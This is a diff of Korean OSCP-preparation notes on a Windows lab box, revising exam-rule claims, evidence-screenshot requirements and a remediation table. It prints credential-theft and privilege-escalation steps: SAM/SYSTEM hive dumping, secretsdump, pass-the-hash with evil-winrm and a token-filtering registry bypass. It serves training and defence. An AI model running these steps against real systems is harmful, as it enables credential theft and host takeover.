+> 2. **SAM/SYSTEM 덤프 → PtH** → `evil-winrm -u administrator -H <해시>` → 대화형 셸. **아무것도 변경하지 않는 가장 깨끗한 경로**
 
 adminstrator 패스워드 변경 후 flag 확인
 ```ps
@@ -662,19 +757,37 @@ net user administrator Password1
 > **[가정]** 이 명령은 필터링된 WinRM 세션이 아니라 **특권 웹셸(2-7과 같은 채널)** 에서 실행됐을 가능성이 높다. 필터링된 토큰으로는 SAM 쓰기가 거부되기 때문이다.
 > 이후 `evil-winrm -u administrator -p 'Password1'` 로 **재접속**하면 RID 500 예외 덕에 **필터링 없는 전체 토큰**을 받아 `C:\Users\Administrator\` 를 읽을 수 있다. 아래 5장의 프롬프트가 그 세션이다.
 
-> [!danger] ⚠️ **시험에서 Administrator 비밀번호 변경은 하지 마라**
-> OSCP 시험 규정은 **"타겟을 망가뜨리거나 다른 응시자의 재현을 방해하는 행위"** 를 금한다. 내장 관리자 비밀번호 변경은 **되돌릴 수 없고**, 채점 재현에 문제를 일으킬 수 있다.
-> **시험용 대안 순서:**
-> 1. **`LocalAccountTokenFilterPolicy=1`** 로 필터링만 푼다 (되돌리기 쉽다 — `/d 0`으로 원복)
-> 2. **특권 웹셸에서 직접** `type C:\Users\Administrator\Desktop\proof.txt` (아무것도 안 바꾼다 — **최선**)
-> 3. 해시를 덤프해 **pass-the-hash**로 붙는다
+> [!danger] ⚠️ **시험에서 Administrator 비밀번호 변경은 하지 마라** — 다만 **이유를 정확히 알아라**
+> **정정:** 이 노트는 원래 *"OSCP 시험 규정은 «타겟을 망가뜨리거나 다른 응시자의 재현을 방해하는 행위»를 금한다"* 고 적었다. **그런 조항은 존재하지 않는다.** Exam Guide·Exam FAQ·Academic Policy·T&C 어디에도 타겟 변조·파일 삭제·서비스 중단을 금지하는 문구가 없고, 점수 몰수(Point Disqualification) 사유는 넷뿐이다 — **제한 도구 사용 / Metasploit·Meterpreter 다중 사용 / proof 미제출 / 문서화 부재**.
+>
+> **진짜 리스크는 규정 위반이 아니라 시간과 진척의 손실이다.**
+> - 되돌릴 방법이 **revert뿐**이고, revert하면 **그 머신의 진척이 전부 사라진다.** 웹셸도, 생성한 계정도, 심어둔 해시도 전부 초기화된다
+> - **AD 세트라면 더 비싸다** — 제공된 침해 자격증명이나 하위 피벗 경로가 함께 죽는다
+> - **리버트는 24회 한정**(1회 리셋 가능)이다. 자기 변조를 수습하느라 쓰는 리버트는 순수한 손해다
+>
+> 즉 이것은 **규정 준수의 문제가 아니라 자기보호의 문제**다. 규정을 근거로 외우면 근거를 물었을 때 무너지고, **"되돌릴 수 없는 변경은 내 진척을 인질로 잡는다"** 로 외우면 무너지지 않는다.
+>
+> > [!note] "다른 응시자의 재현을 방해한다"는 **틀린 근거다** — 그런데 왜 다들 그렇게 알까
+> > OSCP 시험 환경은 **응시자 전용**이다. 다른 응시자와 타겟을 공유하지 않는다.
+> > > "simulates a live network in a **private VPN**" / "The exam lab is a **dedicated environment with no learners connected other than yourself**" / "All of the machines have been freshly reverted at the start of your exam"
+> >
+> > 이 통념의 출처는 **은퇴한 통합 PWK 랩**이다. 당시 공식 문서는 *"Students may encounter exploits left by other learners"* 라고 **공유 환경임을 명시**했다 — 그래서 "남의 익스플로잇이 굴러다닌다", "내가 망가뜨리면 남이 못 푼다"가 상식이었다. 현행 PG는 정반대로 *"private machines … without having to worry that other users will access it"* 다.
+> > **교훈: 커뮤니티 상식의 유통기한을 의심하라.** 랩 구조가 바뀌면 그 위에 세운 규칙도 함께 무효가 된다.
+>
+> **시험용 대안 순서** (⚠️ **웹셸에서 플래그를 읽는 선택지는 여기 없다 — 0점이다.** 위 4장 콜아웃 참조):
+> 1. **`LocalAccountTokenFilterPolicy=1`** 로 필터링만 푼다 → `4leaf` 로 **대화형 WinRM 셸** 확보 → 거기서 `type proof.txt`. **끝나면 `/d 0` 으로 원복**한다 (되돌릴 수 있는 변경)
+> ```
+> (웹셸) reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+> (원복)  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f
+> ```
+> 2. 해시를 덤프해 **pass-the-hash**로 **대화형 셸**을 얻는다 (**아무것도 변경하지 않는다 — 가장 깨끗하다**)
 > ```
 > *Evil-WinRM* PS> reg save HKLM\SAM C:\Windows\Temp\sam.hive
 > *Evil-WinRM* PS> reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
 > (kali) $ secretsdump.py -sam sam.hive -system system.hive LOCAL
 > (kali) $ evil-winrm -i <ip> -u administrator -H <NTLM해시>
 > ```
-> **"플래그를 읽는 것"이 목표이지 "관리자로 로그인하는 것"이 목표가 아니다.** 목표를 헷갈리면 불필요한 변조를 하게 된다.
+> **"플래그를 읽는 것"이 목표이지 "관리자로 로그인하는 것"이 목표가 아니다** — 단 규정상 **읽는 장소가 대화형 셸이어야** 목표가 달성된다. 목표를 헷갈리면 불필요한 변조를 하거나, 변조 없이 읽고도 0점을 받는다.
 
 ---
 
@@ -715,17 +828,24 @@ Mode                LastWriteTime         Length Name
 Get-ChildItem -Path C:\ -Include local.txt,proof.txt -Recurse -ErrorAction SilentlyContinue | Select FullName
 ```
 
-> [!tip] 시험 증거 형식 — 이대로 안 찍으면 **점수가 안 나온다**
-> 플래그 값만 캡처하면 **인정되지 않는다.** 반드시 **한 화면에** 다음이 함께 있어야 한다:
+> [!tip] 시험 증거 형식 — **규정이 요구하는 것**과 **관행상 권장되는 것**을 구분하라
+> 플래그 값만 캡처하면 **인정되지 않는다.** 다만 그 이유를 정확히 알아야 한다 — 이 노트는 원래 `whoami`·`hostname` 을 규정 요건인 것처럼 적었는데, **규정 문구에 그 둘은 없다.**
+>
+> **① 규정이 실제로 요구하는 것 — 셋**
+> | 요건 | 근거 |
+> |---|---|
+> | **대화형 셸**에서 **원위치**의 `type`/`cat` 으로 읽을 것 | "in an **interactive shell** … from their original location" — 웹셸 취득은 **0점** |
+> | 스크린샷에 **플래그 내용 + 타겟 IP**가 함께 보일 것 | "must be shown in a screenshot that includes the contents of the file, as well as **the IP address of the target** by using ipconfig, ifconfig or ip addr" |
+> | **컨트롤 패널에도 값을 제출**할 것 | 스크린샷만으로는 불충분. 둘 다 해야 한다 |
+>
+> **② 규정 문구에는 없지만 반드시 함께 찍어라 — `whoami`**
+> Windows 타겟의 **만점 조건은 "SYSTEM / Administrator / Administrator 권한 사용자의 셸"** 이다. 이 조항을 입증할 실무 수단이 `whoami` 뿐이다. 즉 `whoami` 는 *플래그 요건*이 아니라 *권한 요건*을 증명한다 — **빠뜨리면 규정 위반은 아니지만 채점자가 권한을 확인할 방법이 없다.** `hostname` 도 같은 성격(다중 타겟 리포트에서 혼동 방지)이다.
+>
+> **③ 실무 결론 — 한 줄로 붙여 실행한다**
 > ```powershell
 > whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
 > ```
-> - `whoami` → 어떤 권한으로 읽었는지
-> - `hostname` → 어느 타겟인지
-> - `ipconfig` (또는 `ipconfig /all`) → **타겟 IP가 보여야** 한다
-> - 플래그 내용
->
-> **한 줄로 붙여 실행해서 스크롤 없이 한 화면에 담기게 하는 것이 요령이다.** 이 박스의 기록처럼 `type proof.txt`만 있으면 시험에서는 0점이다. **랩에서부터 이 습관을 들여라.**
+> **스크롤 없이 한 화면에 담기게 하는 것이 요령이다.** 이 박스의 기록처럼 `type proof.txt`만 있으면 **타겟 IP가 없어 규정 요건 미달**이다. **랩에서부터 이 습관을 들여라.**
 
 ---
 
@@ -860,10 +980,11 @@ feroxbuster 출력에 301이 셋 찍힌다. 리눅스 감각으로는 "세 개�
     wmic service get name,pathname,startmode    ← 언쿼티드 경로
     reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
     ```
-15. **`whoami /groups`에 Administrators가 있는데 `whoami /priv`가 초라하면 토큰 필터링이다.** 그룹을 다시 건드리지 말고 → `LocalAccountTokenFilterPolicy=1` 또는 **RID 500(내장 Administrator)** 또는 **특권 웹셸에서 직접 실행**.
-16. **⚠️ 시험에서 Administrator 비밀번호를 바꾸지 마라.** 되돌릴 수 없는 변조다. 대안 순서: **특권 웹셸에서 직접 `type proof.txt`** → `LocalAccountTokenFilterPolicy` 토글(원복 가능) → SAM/SYSTEM 덤프 후 **pass-the-hash**.
-17. **증거 스크린샷은 `whoami; hostname; ipconfig; type proof.txt` 를 한 화면에.** 플래그 값만 찍으면 0점이다.
-18. **시간 배분 기준선** — 이 유형(웹 → SQLi → 업로드 → WinRM)의 목표는 **60~90분**이다.
+15. **`whoami /groups`에 Administrators가 있는데 `whoami /priv`가 초라하면 토큰 필터링이다.** 그룹을 다시 건드리지 말고 → `LocalAccountTokenFilterPolicy=1` 또는 **RID 500(내장 Administrator)** 또는 **특권 웹셸에서 그 우회 작업을 실행**(⚠️ 우회 작업만 — **플래그 읽기는 #17 참조**).
+16. **⚠️ 시험에서 Administrator 비밀번호를 바꾸지 마라.** 되돌릴 수 없는 변조이고, 수습 수단이 **revert(= 그 머신의 진척 전부 소실)** 뿐이다. 대안 순서: ① `LocalAccountTokenFilterPolicy` 토글(**`/d 0` 으로 원복 가능**) → ② SAM/SYSTEM 덤프 후 **pass-the-hash**(아무것도 안 바꾼다). **둘 다 목적은 «대화형 셸 확보»다.**
+17. **⚠️⚠️ 웹셸에서 플래그를 읽으면 그 박스는 0점이다.** 규정 원문이 *"this includes any type of web-based shell"* 로 명시한다. **웹셸은 대화형 셸을 얻는 데 쓰고, 플래그는 그 셸에서 읽는다.** 이 한 줄이 이 노트에서 가장 비싼 교훈이다.
+18. **증거 스크린샷 요건.** **규정 필수**: 대화형 셸에서 읽은 **플래그 내용 + 타겟 IP(`ipconfig`)** 가 한 장에 + **컨트롤 패널 제출**. **강력 권장**: `whoami`(Windows 만점 조건인 «SYSTEM/Administrator 권한 셸»을 입증하는 유일한 실무 수단) · `hostname`. 한 줄로 붙여 실행 — `whoami; hostname; ipconfig; type proof.txt`.
+19. **시간 배분 기준선** — 이 유형(웹 → SQLi → 업로드 → WinRM)의 목표는 **60~90분**이다.
     | 단계 | 목표 | 초과 시 |
     |---|---|---|
     | 전 포트 스캔 + 서비스 식별 | 10분 | — |
@@ -871,7 +992,7 @@ feroxbuster 출력에 301이 셋 찍힌다. 리눅스 감각으로는 "세 개�
     | SQLi 탐지 → 인증 우회 | 20분 | `xp_cmdshell` 경로로 전환, 또는 FTP/SMTP 갈래 |
     | 업로드 → 웹셸 | 15분 | 확장자 사다리를 끝까지 (6장 ⑦) |
     | 권한상승 → 플래그 | 15분 | `whoami /priv` 재확인, 토큰 필터링 의심 |
-19. **SMB/SMTP/FTP 열거가 "다음 행동"으로 안 이어지면 죽은 갈래다.** 사용자명 목록 그 자체는 진전이 아니다.
+20. **SMB/SMTP/FTP 열거가 "다음 행동"으로 안 이어지면 죽은 갈래다.** 사용자명 목록 그 자체는 진전이 아니다.
 
 ---
 
@@ -885,9 +1006,9 @@ feroxbuster 출력에 301이 셋 찍힌다. 리눅스 감각으로는 "세 개�
 | 4 | **스택 쿼리 허용** | `; update ...; --` 성공 | DB 계정 권한 최소화 — 앱 계정에서 **`UPDATE` 권한 회수**, 필요한 것만 **저장 프로시저**로 노출 |
 | 5 | **상세 에러 노출** | 에러 페이지 스크린샷 | `web.config` 에 `<customErrors mode="On" defaultRedirect="~/error.aspx" />`. 스택 트레이스·예외 타입이 새면 DBMS 판정과 스키마 열거가 열린다 |
 | 6 | **솔트 없는 SHA-256 비밀번호 저장** | 해시 = `SHA256("butch")` | **bcrypt / Argon2id / PBKDF2** + 계정별 솔트. 솔트가 있으면 "아는 값의 해시를 심는" 이 공격이 훨씬 어려워진다 |
-| 7 | **임의 확장자 업로드 + 실행 가능 경로** | `.ashx` 웹셸 동작 | **화이트리스트**(허용 확장자만) + **웹루트 밖 저장** + 저장 디렉터리에 `<handlers><clear /></handlers>` 로 실행 차단. 파일명은 서버가 재생성(GUID) |
+| 7 | **실행 가능한 확장자 업로드 허용 + 실행 가능 경로** | `.ashx` 웹셸 동작 | **화이트리스트**(허용 확장자만) + **웹루트 밖 저장** + 저장 디렉터리에 `<handlers><clear /></handlers>` 로 실행 차단. 파일명은 서버가 재생성(GUID) |
 | 8 | **IIS 앱풀이 특권 신원** | 웹셸에서 `net user /add` 성공 | 앱풀을 **`ApplicationPoolIdentity`**(기본)로. 이것만 고쳤어도 RCE가 **로컬 관리자 획득으로 이어지지 않았다** — 이 박스에서 **가장 결정적인 한 줄** |
-| 9 | `SeImpersonatePrivilege` 보유 | (일반) | 서비스 계정에서 회수하거나 최신 패치 유지 — Potato 계열 차단 |
+| 9 | `SeImpersonatePrivilege` 보유 | (일반) | ⚠️ **"최신 패치 유지"는 대책이 아니다.** Microsoft는 서비스 계정 → SYSTEM 임퍼소네이션을 **설계상 동작**으로 취급하며 PrintSpoofer·EfsPotato·GodPotato는 **패치로 막히지 않는다**(Server 2019에서 정상 동작). 실제로 죽은 것은 JuicyPotato 하나이고 그것도 OXID 리졸버 변경의 부산물이다. **실효 있는 조치**: 서비스의 `RequiredPrivileges`에서 해당 특권 제거 · Spooler 서비스 비활성화(PrintSpoofer 차단) · **탐지**로 보완 — 예약 작업 생성(**이벤트 4698**)과 비정상 명명 파이프 생성 모니터링. **근본 대책은 #8**(앱풀을 `ApplicationPoolIdentity`로) — 애초에 특권 신원을 주지 않는 것 |
 | 10 | **WinRM(5985)이 넓게 노출** | nmap | 관리 네트워크로 **IP 제한**, HTTPS(5986) 강제, `Remote Management Users` 멤버십 최소화 |
 | 11 | 로컬 관리자 계정 생성이 무경보 | `4leaf` 생성 | 이벤트 **4720**(계정 생성)·**4732**(그룹 추가) 경보 구성 |
 | 12 | 웹이 비표준 포트(450)라 **보안이 아니다** | — | 포트 변경은 방어가 아니라 지연일 뿐. WAF·요청 필터링을 별도로 |
